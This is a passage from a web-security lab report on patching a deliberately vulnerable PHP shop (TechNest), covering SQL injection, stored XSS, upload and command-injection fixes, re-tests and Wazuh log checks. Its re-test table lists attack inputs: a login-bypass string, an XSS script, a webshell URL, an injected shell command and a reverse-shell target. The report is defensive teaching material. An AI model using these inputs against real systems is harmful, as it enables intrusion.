![](/assets/images/lab/masar-final-project/pasted-data-imageceaf9c_ryNe.png)

The final remediation commits are:

```text
493fcaf fix: prevent command injection in diagnostics
4a97c22 fix: restrict avatar uploads and disable script execution
9f1d3ee fix: encode product reviews to prevent stored xss
18ca18d fix: prevent SQL injection in login
fbab3fe (tag: v1.0-vulnerable-baseline) initial commit: TechNest vulnerable baseline v1.0
```

## 5.2 Code Remediation

### 5.2.1 SQL Injection Fix

File patched:

```javascript
/var/www/html/app/login.php
```

Change made:

- Replaced raw SQL string concatenation with a prepared statement.
- Bound `username` and `password` as parameters.
- Preserved the original successful-login behavior and generic failure message.

Commit:

```text
18ca18d fix: prevent SQL injection in login
```

### 5.2.2 Stored XSS Fix

File patched:

```javascript
/var/www/html/app/product.php
```

Change made:

- Inserted reviews using prepared statements.
- Normalized rating to the range `1` to `5`.
- Encoded review author, rating, and body using `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` before rendering.

Commit:

```text
9f1d3ee fix: encode product reviews to prevent stored xss
```

### 5.2.3 File Upload Fix

File patched:

```javascript
/var/www/html/app/account.php
```

Change made:

- Allowed only actual JPEG, PNG, and GIF MIME types using `finfo_file`.
- Rejected PHP/script uploads.
- Generated server-side avatar filenames with random bytes.
- Updated the user avatar with a prepared statement.
- Encoded account output fields before rendering.

Commit:

```text
4a97c22 fix: restrict avatar uploads and disable script execution
```

Apache upload-directory hardening was also added:

```javascript
<Directory /var/www/html/app/uploads>
    Options -ExecCGI
    AllowOverride None
    <FilesMatch "\.(php|phtml|phar|php[0-9])$">
        Require all denied
    </FilesMatch>
</Directory>
```

Apache configuration validation returned:

```text
Syntax OK
apache2: active
```

### 5.2.4 OS Command Injection Fix

File patched:

```javascript
/var/www/html/app/diagnostics.php
```

Change made:

- Removed shell string concatenation.
- Replaced `shell_exec("ping -c 1 " . $order_id)` with `proc_open(['/usr/bin/ping', '-c', '1', $order_id], ...)`.
- Added strict input validation to reject shell metacharacters, spaces, redirection, and reverse-shell payloads.
- Encoded command output before rendering.

Commit:

```text
493fcaf fix: prevent command injection in diagnostics
```

## 5.3 Patched Application Deployment

All patched PHP files passed syntax validation:

```javascript
No syntax errors detected in /var/www/html/app/login.php
No syntax errors detected in /var/www/html/app/product.php
No syntax errors detected in /var/www/html/app/account.php
No syntax errors detected in /var/www/html/app/diagnostics.php
```

Final service status:

```text
apache2: active
mariadb: active
wazuh-agent: active
rsyslog: active
```

## 5.4 Re-Exploitation Testing

The re-test phase followed the same disciplined order used during investigation:

1. Confirm the patched feature still works for normal user input.
2. Re-run the original exploit attempt in a controlled way.
3. Record the blocked application behavior.
4. Query Wazuh archives to confirm the attempt was still logged.
5. Move to the next test only after both application and SIEM evidence are captured.

Re-test token used for Wazuh correlation:

```text
codex-retest-20260507-200709
```

| Test | Original exploit | Patched result |
| --- | --- | --- |
| Normal login | `admin / secret123` | Still works, HTTP `302 Found` to `index.php` |
| SQLi login bypass | `admin' -- -` | Fails, HTTP `200 OK` with `Invalid username or password` |
| Stored XSS | `<script>alert(1)</script>` review | Raw script absent; escaped text present |
| Normal avatar upload | Valid PNG | Still works; `Avatar updated` shown |
| PHP upload | `shell.php` | Rejected with `Only JPG, PNG, and GIF images are allowed` |
| Webshell access | `/uploads/shell.php?cmd=id` | Blocked with HTTP `403 Forbidden` |
| Command injection | `127.0.0.1 ; id` | Rejected; no `uid=` output present |
| Normal diagnostics | `127.0.0.1` | Still returns ping output |
| Reverse shell payload | `/dev/tcp/192.168.230.130/4444` payload | Rejected by validation before execution |

Key re-test outputs:

```text
SQLi bypass retest body contains invalid login: True
XSS retest raw script present: False
XSS retest escaped script present: True
normal image upload success text: True
PHP upload rejected text: True
shell.php access after containment: HTTP/1.1 403 Forbidden
command injection retest blocked text: True
command injection retest uid output present: False
normal diagnostics has ping output: True
reverse shell payload rejected text: True
```

## 5.5 Detection Query Verification After Patching

Wazuh archived the patched re-test attempts with the unique user-agent token:

```text
codex-retest-20260507-200709
```

Observed archive route counts:

```text
POST /login.php:          3
POST /product.php:        1
POST /account.php:        2
GET /uploads/shell.php:   1
POST /diagnostics.php:    3
Indexer count for token: 11
```

This confirms detection visibility remained after remediation. The application blocks exploitation, while Wazuh still records the attempted attack routes for investigation.

## 5.6 Git Commit History Summary

Final Git history:

```text
493fcaf (HEAD -> master) fix: prevent command injection in diagnostics
4a97c22 fix: restrict avatar uploads and disable script execution
9f1d3ee fix: encode product reviews to prevent stored xss
18ca18d fix: prevent SQL injection in login
fbab3fe (tag: v1.0-vulnerable-baseline) initial commit: TechNest vulnerable baseline v1.0
```

Remaining untracked upload files are runtime artifacts, not source-code changes:

```text
?? uploads/
```

The runtime upload directory contains only avatar image files after containment and re-test. No `shell.php` remains.

---

# Appendix A: Evidence Index

## Infrastructure And Visibility

VM1 IP:

![](/assets/images/lab/masar-final-project/pasted-data-image93b649_ryNe.png)

VM1 services:

![](/assets/images/lab/masar-final-project/pasted-data-image636f17_ryNe.png)

Apache HTTPS configuration:

![](/assets/images/lab/masar-final-project/pasted-data-imagef6e398_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageba1db3_ryNe.png)

Application structure:

![](/assets/images/lab/masar-final-project/pasted-data-image6382f7_ryNe.png)

Git baseline:

![](/assets/images/lab/masar-final-project/pasted-data-imageceaf9c_ryNe.png)

Wazuh deployment:

![](/assets/images/lab/masar-final-project/pasted-data-image8d7458_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagec8f8de_ryNe.png)

Wazuh forwarding:

![](/assets/images/lab/masar-final-project/pasted-data-image23ea24_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image88e99b_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image8044f0_ryNe.png)

## Offensive Evidence

SQL injection:

![](/assets/images/lab/masar-final-project/pasted-data-image7d3f99_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imagec694da_ryNe.png)

Stored XSS:

![](/assets/images/lab/masar-final-project/pasted-data-image59dc87_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image6bb7c2_ryNe.png)

File upload:

![](/assets/images/lab/masar-final-project/pasted-data-image1b894f_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageff5b9b_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-image298162_ryNe.png)

OS command injection:

![](/assets/images/lab/masar-final-project/pasted-data-image926c59_ryNe.png)

Reverse shell:

![](/assets/images/lab/masar-final-project/pasted-data-image49e688_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageb04a4e_ryNe.png)

![](/assets/images/lab/masar-final-project/pasted-data-imageac661d_ryNe.png)
